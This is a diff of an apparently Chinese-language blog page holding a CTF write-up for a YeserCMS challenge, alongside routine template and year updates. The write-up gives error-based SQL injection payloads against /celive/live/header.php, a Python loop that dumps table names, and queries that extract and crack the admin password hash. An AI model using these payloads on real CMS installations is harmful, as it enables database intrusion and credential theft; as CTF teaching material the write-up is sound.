@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -249,7 +249,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>hint：新的CMS系统，帮忙测测是否有漏洞。<br>​           tips:flag在网站根目录下的flag.php中   <a id="more"></a></p>
+        <p>hint：新的CMS系统，帮忙测测是否有漏洞。<br>​           tips:flag在网站根目录下的flag.php中   <span id="more"></span></p>
 <h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><p>内容管理系统（通常缩写为CMS）是帮助用户在网站上创建，管理和修改内容而无需专业技术知识的软件。内容管理系统作为一种工具，可以帮助构建网站，而无需从头开始编写所有代码</p>
 <h2 id="常见判断网站cms方法"><a href="#常见判断网站cms方法" class="headerlink" title="常见判断网站cms方法"></a>常见判断网站cms方法</h2><blockquote>
 <p>1   .robots.txt文件<br>2   .通过版权信息进行查询 (比如网站底部版权信息)<br>3  .通过查看网页源码的方式<br>4  .CMS扫描器<br>5  .cms指纹识别</p>
@@ -259,20 +259,25 @@
 <blockquote>
 <p>EasyCMS是一套使用PHP语言编写的、可扩展的轻量级开源内容管理系统（CMS）。<br>EasyCMS 1.5版本中的App/Modules/Admin/Tpl/default/Public/dwz/uploadify/scripts/uploadify.swf文件存在跨站脚本漏洞。远程攻击者可借助‘uploadifyID’或‘movieName’参数利用该漏洞注入任意的<br>Web脚本或HTML。</p>
 </blockquote>
-<p>百度搜下easycms的漏洞，本题可利用<a href="https://www.cnblogs.com/yangxiaodi/p/6963624.html" target="_blank">无限制报错注入</a>进行</p>
+<p>百度搜下easycms的漏洞，本题可利用<a href='https://www.cnblogs.com/yangxiaodi/p/6963624.html' target="_blank">无限制报错注入</a>进行</p>
 <p>爆数据库：</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url: /celive/live/header.php</span><br><span class="line">post：</span><br><span class="line"></span><br><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>爆表：</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br></pre></td></tr></table></figure>
+
 <p>这里可以看到返回的数据是<code>XPATH syntax error: &#39;[yesercms_a_attachment,yesercms_&#39;</code></p>
 <p>很明显表没有全部列出来，这里可以修改参数<code>1</code>或者py脚本解决</p>
 <p>py脚本如下：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> requests</span><br><span class="line"><span class="attribute">url</span>= &#x27;http://<span class="number">340</span>d<span class="number">45344</span>c<span class="number">5345</span>b<span class="number">7837232</span>f<span class="number">683</span>eac<span class="number">21005849</span>e<span class="number">95</span>f<span class="number">56547</span>e<span class="number">6</span>.changame.ichunqiu.com/celive/live/header.php&#x27;</span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">1</span>,<span class="number">999</span>,<span class="number">31</span>):     #这里的意思是从<span class="number">1</span>开始，隔<span class="number">31</span>各后再取，即i的第二个值为<span class="number">32</span>，至于这里为什么是<span class="number">32</span>，从Post和响应数据可以看出来</span><br><span class="line">    <span class="attribute">postdata</span> = &#123;&#x27;xajax&#x27;: &#x27;Postdata&#x27;, &#x27;xajaxargs[<span class="number">0</span>]&#x27;: <span class="string">&quot;&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),%s,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;&quot;</span> %str(i)&#125;</span><br><span class="line">    <span class="attribute">r</span> = requests.post(url,data=postdata)</span><br><span class="line">    <span class="attribute">print</span>(r.content[<span class="number">22</span>:<span class="number">53</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> requests</span><br><span class="line"><span class="attribute">url</span>= &#x27;http://<span class="number">340</span>d45344c5345b7837232f683eac21005849e95f56547e6.changame.ichunqiu.com/celive/live/header.php&#x27;</span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">1</span>,<span class="number">999</span>,<span class="number">31</span>):     #这里的意思是从<span class="number">1</span>开始，隔<span class="number">31</span>各后再取，即i的第二个值为<span class="number">32</span>，至于这里为什么是<span class="number">32</span>，从Post和响应数据可以看出来</span><br><span class="line">    <span class="attribute">postdata</span> = &#123;&#x27;xajax&#x27;: &#x27;Postdata&#x27;, &#x27;xajaxargs[<span class="number">0</span>]&#x27;: <span class="string">&quot;&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),%s,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;&quot;</span> %str(i)&#125;</span><br><span class="line">    <span class="attribute">r</span> = requests.post(url,data=postdata)</span><br><span class="line">    <span class="attribute">print</span>(r.content[<span class="number">22</span>:<span class="number">53</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>有个yesercms_user表，尝试从这个表爆字段：</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(concat(username,<span class="string">&#x27;|&#x27;</span>,<span class="keyword">password</span>)) <span class="keyword">from</span> yesercms_user),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>得到[admin|ff512d4240cbbdeafada40467</p>
 <p>猜测密码为MD5加密，但是位数不够，将1，32 改为 33，64</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((<span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(concat(username,<span class="string">&#x27;|&#x27;</span>,<span class="keyword">password</span>)) <span class="keyword">from</span> yesercms_user),<span class="number">33</span>,<span class="number">64</span>),<span class="number">0x5d</span>),<span class="number">1</span>)),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)-- &lt;/q&gt;&lt;/xjxquery&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>得到ccbe61</p>
 <p>拼接md5解密得Yeser231</p>
 <p>因此账号为admin,密码为Yeser231</p>
@@ -393,7 +398,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -457,7 +462,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
